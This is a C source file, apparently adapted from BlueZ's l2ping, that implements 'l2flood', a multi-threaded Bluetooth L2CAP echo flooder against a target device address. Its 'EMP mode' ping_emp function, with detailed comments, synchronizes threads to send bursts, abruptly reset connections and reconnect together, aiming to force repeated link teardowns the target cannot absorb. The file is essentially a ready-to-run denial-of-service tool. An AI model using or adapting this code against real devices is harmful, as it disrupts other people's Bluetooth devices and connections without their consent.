/*
 *
 *  BlueZ - Bluetooth protocol stack for Linux
 *
 *  Copyright (C) 2000-2001  Qualcomm Incorporated
 *  Copyright (C) 2002-2003  Maxim Krasnyansky <maxk@qualcomm.com>
 *  Copyright (C) 2002-2010  Marcel Holtmann <marcel@holtmann.org>
 *
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <ctype.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/poll.h>
#include <sys/socket.h>

#ifdef _OPENMP
#include <omp.h>
#endif

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

/* Defaults */
static bdaddr_t bdaddr;
static int ident   = 200;
#ifdef _OPENMP
static int size    = 600;
static int delay   = 0;
static int threads;
#else
static int size    = 44;
static int delay   = 1;
#endif
static int count   = -1;
static int timeout = 10;
static int reverse = 0;
static int verify = 0;

#ifdef _OPENMP
/* EMP mode flag */
static int reconnect = 0;   /* -R */
#endif

/* Stats */
static int sent_pkt = 0;
static int recv_pkt = 0;

static float tv2fl(struct timeval tv)
{
	return (float)(tv.tv_sec*1000.0) + (float)(tv.tv_usec/1000.0);
}

static void sigint_handler(int sig)
{
	int loss = sent_pkt ? (float)((sent_pkt-recv_pkt)/(sent_pkt/100.0)) : 0;
	printf("%d sent, %d received, %d%% loss\n", sent_pkt, recv_pkt, loss);
	exit(0);
}

/*
 * Validate a BD_ADDR string: must be exactly XX:XX:XX:XX:XX:XX
 * where X is a hex digit. Returns 1 if valid, 0 if not.
 */
static int valid_bdaddr(const char *s)
{
	int i;

	if (!s || strlen(s) != 17)
		return 0;

	for (i = 0; i < 17; i++) {
		if ((i + 1) % 3 == 0) {
			if (s[i] != ':')
				return 0;
		} else {
			if (!isxdigit((unsigned char)s[i]))
				return 0;
		}
	}
	return 1;
}

/*
 * Parse a positive integer from a string. Returns -1 on failure
 * (empty string, non-numeric characters, overflow).
 */
static long parse_positive_int(const char *s, const char *name)
{
	char *end;
	long val;

	if (!s || !*s) {
		fprintf(stderr, "Error: -%s requires a numeric argument\n", name);
		return -1;
	}

	val = strtol(s, &end, 10);
	if (*end != '\0') {
		fprintf(stderr, "Error: -%s value '%s' is not a valid number\n", name, s);
		return -1;
	}
	if (val < 0) {
		fprintf(stderr, "Error: -%s value must not be negative\n", name);
		return -1;
	}

	return val;
}

static void usage(void)
{
#ifdef _OPENMP
	printf("l2flood - L2CAP flood (OpenMP parallel build)\n\n");
	printf("Usage:\n");
	printf("  l2flood [options] <bdaddr>\n\n");
#else
	printf("l2flood - L2CAP flood (serial build)\n\n");
	printf("Usage:\n");
	printf("  l2flood [options] <bdaddr>\n\n");
#endif
	printf("Arguments:\n");
	printf("  <bdaddr>       Target Bluetooth address (XX:XX:XX:XX:XX:XX)\n\n");
	printf("Options:\n");
	printf("  -i <device>    HCI adapter: 'hci0', 'hci1', etc. (default: any)\n");
	printf("  -s <bytes>     L2CAP echo payload size (default: %d)\n",
#ifdef _OPENMP
		600
#else
		44
#endif
	);
	printf("  -c <count>     Number of packets to send, -1 for infinite (default: -1)\n");
	printf("  -t <seconds>   Response timeout per packet (default: 10)\n");
	printf("  -d <seconds>   Delay between packets (default: %d)\n",
#ifdef _OPENMP
		0
#else
		1
#endif
	);
	printf("  -f             Flood mode: set delay to 0\n");
	printf("  -r             Reverse: send echo responses instead of requests\n");
	printf("  -v             Verify response payload matches request\n");
#ifdef _OPENMP
	printf("  -n <threads>   Number of parallel threads (default: number of CPUs)\n");
	printf("  -R             EMP mode: fire-and-forget burst-reconnect cycling\n");
#endif
	printf("\nExamples:\n");
	printf("  l2flood -i hci1 AA:BB:CC:DD:EE:FF\n");
	printf("  l2flood -i hci0 -s 600 -c 1000 AA:BB:CC:DD:EE:FF\n");
#ifdef _OPENMP
	printf("  l2flood -i hci1 -R AA:BB:CC:DD:EE:FF\n");
#endif
}

/* ------------------------------------------------------------
 *  Normal mode
 * ----------------------------------------------------------- */
static void ping_normal(char *svr)
{
	struct sigaction sa;
	struct sockaddr_l2 addr;
	socklen_t optlen;
	unsigned char *send_buf;
	unsigned char *recv_buf;
	char str[18];
	int i, sk, lost;
	uint8_t id;

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = sigint_handler;
	sigaction(SIGINT, &sa, NULL);

	send_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
	recv_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
	if (!send_buf || !recv_buf) {
		perror("Can't allocate buffer");
		exit(1);
	}

	/* Create socket */
	sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
	if (sk < 0) {
		perror("Can't create socket");
		goto error;
	}

	/* Bind to local address */
	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	bacpy(&addr.l2_bdaddr, &bdaddr);

	if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("Can't bind socket");
		goto error;
	}

	/* Connect to remote device */
	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	str2ba(svr, &addr.l2_bdaddr);

	if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("Can't connect");
		goto error;
	}

	/* Get local address */
	memset(&addr, 0, sizeof(addr));
	optlen = sizeof(addr);

	if (getsockname(sk, (struct sockaddr *) &addr, &optlen) < 0) {
		perror("Can't get local address");
		goto error;
	}

	ba2str(&addr.l2_bdaddr, str);
	/* Only one thread prints the banner. */
#ifdef _OPENMP
	#pragma omp single nowait
#endif
	printf("Ping: %s from %s (data size %d) ...\n", svr, str, size);

	/* Initialize send buffer */
	for (i = 0; i < size; i++)
		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';

	id = ident;

	while (count == -1 || count-- > 0) {
		struct timeval tv_send, tv_recv, tv_diff;
		l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;
		l2cap_cmd_hdr *recv_cmd = (l2cap_cmd_hdr *) recv_buf;

		/* Build command header */
		send_cmd->ident = id;
		send_cmd->len   = htobs(size);

		if (reverse)
			send_cmd->code = L2CAP_ECHO_RSP;
		else
			send_cmd->code = L2CAP_ECHO_REQ;

		gettimeofday(&tv_send, NULL);

		/* Send Echo Command */
		if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0) {
			perror("Send failed");
			goto error;
		}

		/* Wait for Echo Response */
		lost = 0;
		while (1) {
			struct pollfd pf[1];
			int err;

			pf[0].fd = sk;
			pf[0].events = POLLIN;

			if ((err = poll(pf, 1, timeout * 1000)) < 0) {
				perror("Poll failed");
				goto error;
			}

			if (!err) {
				lost = 1;
				break;
			}

			if ((err = recv(sk, recv_buf, L2CAP_CMD_HDR_SIZE + size, 0)) < 0) {
				perror("Recv failed");
				goto error;
			}

			if (!err){
				printf("Disconnected\n");
				goto error;
			}

			recv_cmd->len = btohs(recv_cmd->len);

			/* Check for our id */
			if (recv_cmd->ident != id)
				continue;

			/* Check type */
			if (!reverse && recv_cmd->code == L2CAP_ECHO_RSP)
				break;

			if (recv_cmd->code == L2CAP_COMMAND_REJ) {
				printf("Peer doesn't support Echo packets\n");
				goto error;
			}

		}
		/* Both counters are shared across threads; atomic is required. */
#ifdef _OPENMP
		#pragma omp atomic
#endif
		sent_pkt++;

		if (!lost) {
#ifdef _OPENMP
			#pragma omp atomic
#endif
			recv_pkt++;

			gettimeofday(&tv_recv, NULL);
			timersub(&tv_recv, &tv_send, &tv_diff);

			if (verify) {
				/* Check payload length */
				if (recv_cmd->len != size) {
					fprintf(stderr, "Received %d bytes, expected %d\n",
						   recv_cmd->len, size);
					goto error;
				}

				/* Check payload */
				if (memcmp(&send_buf[L2CAP_CMD_HDR_SIZE],
						   &recv_buf[L2CAP_CMD_HDR_SIZE], size)) {
					fprintf(stderr, "Response payload different.\n");
					goto error;
				}
			}

#ifdef _OPENMP
			printf("%d bytes from %s id %d time %.2fms thread %d\n", recv_cmd->len, svr,
				   id - ident, tv2fl(tv_diff), omp_get_thread_num());
#else
			printf("%d bytes from %s id %d time %.2fms\n", recv_cmd->len, svr,
				   id - ident, tv2fl(tv_diff));
#endif

		} else {
			printf("no response from %s: id %d\n", svr, id - ident);
		}

		/* Always sleep regardless of whether the packet was lost,
		 * so the inter-ping interval is consistent. */
		if (delay)
			sleep(delay);

		if (++id > 254)
			id = ident;
	}
	sigint_handler(0);
	free(send_buf);
	free(recv_buf);
	return;

error:
	close(sk);
	free(send_buf);
	free(recv_buf);
	exit(1);
}

#ifdef _OPENMP
/* ------------------------------------------------------------
 *  EMP mode (reconnect == 1): fire-and-forget, synchronized burst-reconnect
 *
 *  Architecture:
 *    All OpenMP threads share one ACL link to the target (BT allows only one
 *    ACL link per remote per local adapter). If threads reconnect independently
 *    and staggered, they just reopen L2CAP channels on the existing ACL link
 *    and the link never fully drops -- the target handles it fine.
 *
 *    To force regular full ACL teardowns we use a burst-and-resync loop:
 *      1. All threads connect (simultaneously after each resync)
 *      2. Each thread sends EMP_BURST_PKTS packets then closes intentionally
 *      3. EMP_RESYNC_US sleep after close lets all threads reach closed state
 *         at roughly the same time
 *      4. All threads reconnect together -- same synchronized pressure as
 *         startup, every cycle
 *
 *    This guarantees periodic full ACL teardown+setup instead of staggered
 *    L2CAP channel shuffling that the target can absorb without disconnecting.
 * ----------------------------------------------------------- */

/* Packets per connection before forced close. Tuned for a balance between
 * flood duration per connection and ACL cycling frequency. */
#define EMP_BURST_PKTS  50

/* Microseconds all threads sleep after closing, so they reach the connect
 * phase together and hit the target simultaneously on every cycle. */
#define EMP_RESYNC_US   5000

static void ping_emp(char *svr)
{
	struct sigaction sa;
	unsigned char *send_buf;
	int sk = -1;
	int i, printed = 0;
	int reuse = 1;
	int connect_fails = 0;
	int last_err = 0;
	struct linger ling = {1, 0};
	struct sockaddr_l2 addr;

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = sigint_handler;
	sigaction(SIGINT, &sa, NULL);

	send_buf = malloc(L2CAP_CMD_HDR_SIZE + size);
	if (!send_buf) exit(1);

	for (i = 0; i < size; i++)
		send_buf[L2CAP_CMD_HDR_SIZE + i] = (i % 40) + 'A';

	/* Spread packet IDs across threads so they don't all send id=200.
	 * ident=200, range is 200-254 (55 values). Thread N starts at
	 * ident + (N % 55) giving each thread a unique starting id. */
	uint8_t id = (uint8_t)(ident + (omp_get_thread_num() % 55));

	while (count == -1 || count-- > 0) {
		l2cap_cmd_hdr *send_cmd = (l2cap_cmd_hdr *) send_buf;

		/* --------------------------------------------------
		 * PHASE 1: CONNECT
		 * All threads enter this together after each resync.
		 * -------------------------------------------------- */
		while (sk < 0) {
			/* No sleep before first attempt -- startup and post-disconnect
			 * reconnects are instant. usleep(2000) is added only on each
			 * failure path below, so the CPU is still protected when the
			 * target is offline (failed attempts are the hot path). */
			sk = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
			if (sk < 0) { usleep(2000); continue; }

			/* O_NONBLOCK: connect() returns EINPROGRESS immediately
			 * so we never block for the full kernel BT page timeout. */
			{
				int fl = fcntl(sk, F_GETFL, 0);
				if (fl >= 0)
					fcntl(sk, F_SETFL, fl | O_NONBLOCK);
			}

			setsockopt(sk, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
			/* SO_LINGER {1,0}: close() sends RST immediately instead of
			 * a graceful detach -- abrupt teardown on every cycle. */
			setsockopt(sk, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));

			memset(&addr, 0, sizeof(addr));
			addr.l2_family = AF_BLUETOOTH;
			bacpy(&addr.l2_bdaddr, &bdaddr);
			if (bind(sk, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
				close(sk); sk = -1; usleep(2000); continue;
			}

			memset(&addr, 0, sizeof(addr));
			addr.l2_family = AF_BLUETOOTH;
			str2ba(svr, &addr.l2_bdaddr);

			if (connect(sk, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
				if (errno == EINPROGRESS) {
					/* Poll up to 1.5s for connection completion.
					 * BT paging + ACL setup can take 1-3s on a
					 * freshly recovered device. 1.5s catches it
					 * reliably without stalling the cycle too long. */
					struct pollfd cpf = {sk, POLLOUT, 0};
					if (poll(&cpf, 1, 1500) > 0) {
						int err = 0;
						socklen_t elen = sizeof(err);
						getsockopt(sk, SOL_SOCKET, SO_ERROR, &err, &elen);
						if (err != 0) {
							if (err != last_err || connect_fails % 50 == 0) {
								fprintf(stderr, "EMP connect: %s (attempt %d)\n",
									strerror(err), connect_fails + 1);
								last_err = err;
							}
							connect_fails++;
							close(sk); sk = -1; usleep(2000); continue;
						}
					} else {
						connect_fails++;
						if (connect_fails % 50 == 0)
							fprintf(stderr, "EMP connect: poll timeout (attempt %d)\n",
								connect_fails);
						close(sk); sk = -1; usleep(2000); continue;
					}
				} else {
					if (errno != last_err || connect_fails % 50 == 0) {
						fprintf(stderr, "EMP connect: %s (attempt %d)\n",
							strerror(errno), connect_fails + 1);
						last_err = errno;
					}
					connect_fails++;
					close(sk); sk = -1; usleep(2000); continue;
				}
			}

			/* Connected. Switch back to blocking sends so the kernel
			 * buffer stays full and send pressure is continuous.
			 * SO_SNDTIMEO caps each send at 300ms so a dead link is
			 * detected fast without the thread hanging. */
			{
				int fl = fcntl(sk, F_GETFL, 0);
				if (fl >= 0)
					fcntl(sk, F_SETFL, fl & ~O_NONBLOCK);
			}
			{
				struct timeval snd_tv = {0, 300000}; /* 300ms */
				setsockopt(sk, SOL_SOCKET, SO_SNDTIMEO, &snd_tv, sizeof(snd_tv));
			}

			if (connect_fails > 0) {
				printf("EMP reconnected after %d failed attempt(s)\n",
					   connect_fails);
				connect_fails = 0;
				last_err = 0;
			}

			if (!printed) {
				char str[18];
				socklen_t optlen = sizeof(addr);
				memset(&addr, 0, sizeof(addr));
				if (getsockname(sk, (struct sockaddr *)&addr, &optlen) == 0) {
					ba2str(&addr.l2_bdaddr, str);
					printf("Ping: %s from %s (data size %d) ...\n",
						   svr, str, size);
				}
				printed = 1;
			}
		}

		/* --------------------------------------------------
		 * PHASE 2: BURST
		 * Send EMP_BURST_PKTS frames then close intentionally.
		 * Short fixed burst keeps ACL cycling frequent.
		 * -------------------------------------------------- */
		for (i = 0; i < EMP_BURST_PKTS; i++) {
			send_cmd->ident = id;
			send_cmd->len   = htobs(size);
			send_cmd->code  = reverse ? L2CAP_ECHO_RSP : L2CAP_ECHO_REQ;

			if (send(sk, send_buf, L2CAP_CMD_HDR_SIZE + size, 0) <= 0)
				break; /* link died mid-burst, fall through to close */

			#pragma omp atomic
			sent_pkt++;

			if (++id > 254) id = ident;
		}

		/* --------------------------------------------------
		 * PHASE 3: FORCED CLOSE + RESYNC
		 * Always close after each burst regardless of whether
		 * send failed. The resync sleep gives all threads time
		 * to also close so the next connect round is synchronized
		 * -- recreating the full-ACL-teardown pressure every cycle.
		 * -------------------------------------------------- */
		close(sk);
		sk = -1;
		usleep(EMP_RESYNC_US);
	}

	free(send_buf);
	sigint_handler(0);
}
#endif /* _OPENMP */

/* Wrapper */
static void ping(char *svr)
{
#ifdef _OPENMP
	if (reconnect)
		ping_emp(svr);
	else
#endif
		ping_normal(svr);
}

int main(int argc, char *argv[])
{
	int i;
	long val;
	char *target = NULL;

	if (argc < 2) {
		usage();
		exit(1);
	}

	/* Default options */
	bacpy(&bdaddr, BDADDR_ANY);
#ifdef _OPENMP
	threads = sysconf(_SC_NPROCESSORS_ONLN);
	if (threads < 1) threads = 1;
#endif

	/* Manual argument parsing to avoid GNU getopt permutation issues.
	 * Scan argv once: flags with arguments consume the next element,
	 * bare flags are handled inline, anything else is the target. */
	for (i = 1; i < argc; i++) {
		if (argv[i][0] != '-') {
			/* Positional argument: target BD_ADDR */
			if (target) {
				fprintf(stderr, "Error: unexpected extra argument '%s'\n", argv[i]);
				fprintf(stderr, "       (use -i to specify the HCI adapter)\n\n");
				usage();
				exit(1);
			}
			target = argv[i];
			continue;
		}

		/* Single-character flags, possibly combined (-rv) */
		if (strlen(argv[i]) < 2) {
			fprintf(stderr, "Error: bare '-' is not a valid option\n");
			usage();
			exit(1);
		}

		switch (argv[i][1]) {
		case 'i':
			if (++i >= argc) {
				fprintf(stderr, "Error: -i requires an argument\n");
				exit(1);
			}
			if (!strncasecmp(argv[i], "hci", 3))
				hci_devba(atoi(argv[i] + 3), &bdaddr);
			else
				str2ba(argv[i], &bdaddr);
			break;

		case 'd':
			if (++i >= argc) {
				fprintf(stderr, "Error: -d requires an argument\n");
				exit(1);
			}
			val = parse_positive_int(argv[i], "d");
			if (val < 0) exit(1);
			delay = (int)val;
			break;

		case 'f':
			delay = 0;
			break;

		case 'r':
			reverse = 1;
			break;

		case 'v':
			verify = 1;
			break;

		case 'c':
			if (++i >= argc) {
				fprintf(stderr, "Error: -c requires an argument\n");
				exit(1);
			}
			count = atoi(argv[i]);
			break;

		case 't':
			if (++i >= argc) {
				fprintf(stderr, "Error: -t requires an argument\n");
				exit(1);
			}
			val = parse_positive_int(argv[i], "t");
			if (val < 0) exit(1);
			if (val == 0) {
				fprintf(stderr, "Error: -t timeout must be > 0\n");
				exit(1);
			}
			timeout = (int)val;
			break;

		case 's':
			if (++i >= argc) {
				fprintf(stderr, "Error: -s requires an argument\n");
				exit(1);
			}
			val = parse_positive_int(argv[i], "s");
			if (val < 0) exit(1);
			if (val == 0) {
				fprintf(stderr, "Error: -s size must be > 0\n");
				exit(1);
			}
			if (val > 65535) {
				fprintf(stderr, "Error: -s size must be <= 65535\n");
				exit(1);
			}
			size = (int)val;
			break;

#ifdef _OPENMP
		case 'R':
			reconnect = 1;
			break;

		case 'n':
			if (++i >= argc) {
				fprintf(stderr, "Error: -n requires an argument\n");
				exit(1);
			}
			val = parse_positive_int(argv[i], "n");
			if (val < 0) exit(1);
			if (val == 0) {
				fprintf(stderr, "Error: -n threads must be > 0\n");
				exit(1);
			}
			threads = (int)val;
			break;
#endif

		case 'h':
			usage();
			exit(0);

		default:
			fprintf(stderr, "Error: unknown option '-%c'\n\n", argv[i][1]);
			usage();
			exit(1);
		}
	}

	if (!target) {
		fprintf(stderr, "Error: missing target BD_ADDR\n\n");
		usage();
		exit(1);
	}

	if (!valid_bdaddr(target)) {
		fprintf(stderr, "Error: '%s' is not a valid BD_ADDR (expected XX:XX:XX:XX:XX:XX)\n",
			target);
		exit(1);
	}

#ifdef _OPENMP
	#pragma omp parallel num_threads(threads)
#endif
	{
		ping(target);
	}

	return 0;
}
